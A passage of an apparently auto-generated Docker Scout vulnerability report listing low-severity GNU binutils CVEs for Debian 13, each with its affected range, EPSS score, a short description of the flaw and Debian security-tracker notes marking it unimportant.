https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=598704a00cbac5e85c2bedd363357b5bf6fcee33
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69645?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69645" src="https://img.shields.io/badge/CVE--2025--69645-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

Binutils objdump contains a denial-of-service vulnerability when processing a crafted binary with malformed DWARF debug information. A logic error in the handling of DWARF compilation units can result in an invalid offset_size value being used inside byte_get_little_endian, leading to an abort (SIGABRT). The issue was observed in binutils 2.44. A local attacker can trigger the crash by supplying a malicious input file.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33637
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=cdb728d4da6184631989b192f1022c219dea7677
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-69644?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--69644" src="https://img.shields.io/badge/CVE--2025--69644-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.006%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>0th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in Binutils before 2.46. The objdump contains a denial-of-service vulnerability when processing a crafted binary with malformed debug information. A logic flaw in the handling of DWARF location list headers can cause objdump to enter an unbounded loop and produce endless output until manually interrupted. This issue affects versions prior to the upstream fix and allows a local attacker to cause excessive resource consumption by supplying a malicious input file.

---
- binutils <unfixed> (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33639
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=455446bbdc8675f34808187de2bbad4682016ff7
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66866?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--66866" src="https://img.shields.io/badge/CVE--2025--66866-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.035%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>10th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_abi_tags in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66865?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--66865" src="https://img.shields.io/badge/CVE--2025--66865-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.174%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_print_comp_inner in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66864?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--66864" src="https://img.shields.io/badge/CVE--2025--66864-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.122%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>31st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_print_comp_inner in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66863?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--66863" src="https://img.shields.io/badge/CVE--2025--66863-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.174%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>38th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_discriminator in file cp-demangle.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66862?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--66862" src="https://img.shields.io/badge/CVE--2025--66862-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.128%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A buffer overflow vulnerability in function gnu_special in file cplus-dem.c in BinUtils 2.26 allows attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-66861?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--66861" src="https://img.shields.io/badge/CVE--2025--66861-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.042%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>13th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

An issue was discovered in function d_unqualified_name in file cp-demangle.c in BinUtils 2.26 allowing attackers to cause a denial of service via crafted PE file.

---
- binutils <unfixed> (unimportant)
binutils not covered by security support and most certainly bogus since they
were assigned for a very old binutils release

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-5245?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--5245" src="https://img.shields.io/badge/CVE--2025--5245-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.084%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as critical has been found in GNU Binutils up to 2.44. This affects the function debug_type_samep of the file /binutils/debug.c of the component objdump. The manipulation leads to memory corruption. Local access is required to approach this attack. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32829
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=6c3458a8b7ee7d39f070c7b2350851cb2110c65a
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-5244?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--5244" src="https://img.shields.io/badge/CVE--2025--5244-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.081%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils up to 2.44. It has been rated as critical. Affected by this issue is the function elf_gc_sweep of the file bfd/elflink.c of the component ld. The manipulation leads to memory corruption. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. Upgrading to version 2.45 is able to address this issue. It is recommended to upgrade the affected component.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32858
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=d1458933830456e54223d9fc61f0d9b3a19256f5
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-3198?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--3198" src="https://img.shields.io/badge/CVE--2025--3198-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.134%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>32nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability has been found in GNU Binutils 2.43/2.44 and classified as problematic. Affected by this vulnerability is the function display_info of the file binutils/bucomm.c of the component objdump. The manipulation leads to memory leak. An attack has to be approached locally. The exploit has been disclosed to the public and may be used. The patch is named ba6ad3a18cb26b79e0e3b84c39f707535bbc344d. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32716
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=ba6ad3a18cb26b79e0e3b84c39f707535bbc344d
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11840?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11840" src="https://img.shields.io/badge/CVE--2025--11840-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.032%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A weakness has been identified in GNU Binutils 2.45. The affected element is the function vfinfo of the file ldmisc.c. Executing a manipulation can lead to out-of-bounds read. The attack can only be executed locally. The exploit has been made available to the public and could be used for attacks. This patch is called 16357. It is best practice to apply a patch to resolve this issue.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33455
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=f6b0f53a36820da91eadfa9f466c22f92e4256e0 (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11839?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11839" src="https://img.shields.io/badge/CVE--2025--11839-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.026%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>7th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A security flaw has been discovered in GNU Binutils 2.45. Impacted is the function tg_tag_type of the file prdbg.c. Performing a manipulation results in unchecked return value. The attack needs to be approached locally. The exploit has been released to the public and may be used for attacks.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33448
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=12ef7d5b7b02d0023db645d86eb9d0797bc747fe (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1182?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1182" src="https://img.shields.io/badge/CVE--2025--1182-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.104%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>28th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability, which was classified as critical, was found in GNU Binutils 2.43. Affected is the function bfd_elf_reloc_symbol_deleted_p of the file bfd/elflink.c of the component ld. The manipulation leads to memory corruption. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. The patch is identified as b425859021d17adf62f06fb904797cf8642986ad. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32644
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=b425859021d17adf62f06fb904797cf8642986ad
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1181?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1181" src="https://img.shields.io/badge/CVE--2025--1181-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.117%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as critical was found in GNU Binutils 2.43. This vulnerability affects the function _bfd_elf_gc_mark_rsec of the file bfd/elflink.c of the component ld. The manipulation leads to memory corruption. The attack can be initiated remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The name of the patch is 931494c9a89558acb36a03a340c01726545eef24. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32643
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=931494c9a89558acb36a03a340c01726545eef24
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1180?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1180" src="https://img.shields.io/badge/CVE--2025--1180-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.082%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic has been found in GNU Binutils 2.43. This affects the function _bfd_elf_write_section_eh_frame of the file bfd/elf-eh-frame.c of the component ld. The manipulation leads to memory corruption. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32642
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1178?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1178" src="https://img.shields.io/badge/CVE--2025--1178-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.120%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>30th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been declared as problematic. Affected by this vulnerability is the function bfd_putl64 of the file libbfd.c of the component ld. The manipulation leads to memory corruption. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. The identifier of the patch is 75086e9de1707281172cc77f178e7949a4414ed0. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32638
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=75086e9de1707281172cc77f178e7949a4414ed0
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1176?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1176" src="https://img.shields.io/badge/CVE--2025--1176-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.213%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>44th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43 and classified as critical. This issue affects the function _bfd_elf_gc_mark_rsec of the file elflink.c of the component ld. The manipulation leads to heap-based buffer overflow. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. The patch is named f9978defb6fab0bd8583942d97c112b0932ac814. It is recommended to apply a patch to fix this issue.

---
- binutils 2.45-3 (unimportant; bug https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=1108986)
https://sourceware.org/bugzilla/show_bug.cgi?id=32636
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=f9978defb6fab0bd8583942d97c112b0932ac814
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1153?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1153" src="https://img.shields.io/badge/CVE--2025--1153-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.083%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>24th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic was found in GNU Binutils 2.43/2.44. Affected by this vulnerability is the function bfd_set_format of the file format.c. The manipulation leads to memory corruption. The attack can be launched remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. Upgrading to version 2.45 is able to address this issue. The identifier of the patch is 8d97c1a53f3dc9fd8e1ccdb039b8a33d50133150. It is recommended to upgrade the affected component.

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32603
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=8d97c1a53f3dc9fd8e1ccdb039b8a33d50133150
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1152?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1152" src="https://img.shields.io/badge/CVE--2025--1152-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability classified as problematic has been found in GNU Binutils 2.43. Affected is the function xstrdup of the file xstrdup.c of the component ld. The manipulation leads to memory leak. It is possible to launch the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1151?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1151" src="https://img.shields.io/badge/CVE--2025--1151-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been rated as problematic. This issue affects the function xmemdup of the file xmemdup.c of the component ld. The manipulation leads to memory leak. The attack may be initiated remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1150?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1150" src="https://img.shields.io/badge/CVE--2025--1150-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been declared as problematic. This vulnerability affects the function bfd_malloc of the file libbfd.c of the component ld. The manipulation leads to memory leak. The attack can be initiated remotely. The complexity of an attack is rather high. The exploitation appears to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11495?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11495" src="https://img.shields.io/badge/CVE--2025--11495-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.030%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>9th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was determined in GNU Binutils 2.45. The affected element is the function elf_x86_64_relocate_section of the file elf64-x86-64.c of the component Linker. This manipulation causes heap-based buffer overflow. The attack can only be executed locally. The exploit has been publicly disclosed and may be utilized. Patch name: 6b21c8b2ecfef5c95142cbc2c32f185cb1c26ab0. To fix this issue, it is recommended to deploy a patch.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33502
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=6b21c8b2ecfef5c95142cbc2c32f185cb1c26ab0 (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-11494?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--11494" src="https://img.shields.io/badge/CVE--2025--11494-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.039%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>12th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.45. Impacted is the function _bfd_x86_elf_late_size_sections of the file bfd/elfxx-x86.c of the component Linker. The manipulation results in out-of-bounds read. The attack needs to be approached locally. The exploit has been made public and could be used. The patch is identified as b6ac5a8a5b82f0ae6a4642c8d7149b325f4cc60a. A patch should be applied to remediate this issue.

---
- binutils 2.46-1 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=33499
https://sourceware.org/git/gitweb.cgi?p=binutils-gdb.git;h=b6ac5a8a5b82f0ae6a4642c8d7149b325f4cc60a (binutils-2_46)
binutils not covered by security support

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1149?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1149" src="https://img.shields.io/badge/CVE--2025--1149-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.048%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>15th percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43. It has been classified as problematic. This affects the function xstrdup of the file libiberty/xmalloc.c of the component ld. The manipulation leads to memory leak. It is possible to initiate the attack remotely. The complexity of an attack is rather high. The exploitability is told to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1148?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1148" src="https://img.shields.io/badge/CVE--2025--1148-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.072%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>22nd percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

A vulnerability was found in GNU Binutils 2.43 and classified as problematic. Affected by this issue is the function link_order_scan of the file ld/ldelfgen.c of the component ld. The manipulation leads to memory leak. The attack may be launched remotely. The complexity of an attack is rather high. The exploitation is known to be difficult. The exploit has been disclosed to the public and may be used. It is recommended to apply a patch to fix this issue. The code maintainer explains: "I'm not going to commit some of the leak fixes I've been working on to the 2.44 branch due to concern that would destabilise ld. All of the reported leaks in this bugzilla have been fixed on binutils master."

---
- binutils 2.45-3 (unimportant)
https://sourceware.org/bugzilla/show_bug.cgi?id=32576
binutils not covered by security support
These were fixed in master, so 2.45 at the time

</blockquote>
</details>

<a href="https://scout.docker.com/v/CVE-2025-1147?s=debian&n=binutils&ns=debian&t=deb&osn=debian&osv=13&vr=%3E0"><img alt="low : CVE--2025--1147" src="https://img.shields.io/badge/CVE--2025--1147-lightgrey?label=low%20&labelColor=fce1a9"/></a> 

<table>
<tr><td>Affected range</td><td><code>>0</code></td></tr>
<tr><td>Fixed version</td><td><strong>Not Fixed</strong></td></tr>
<tr><td>EPSS Score</td><td><code>0.067%</code></td></tr>
<tr><td>EPSS Percentile</td><td><code>21st percentile</code></td></tr>
</table>

<details><summary>Description</summary>
<blockquote>

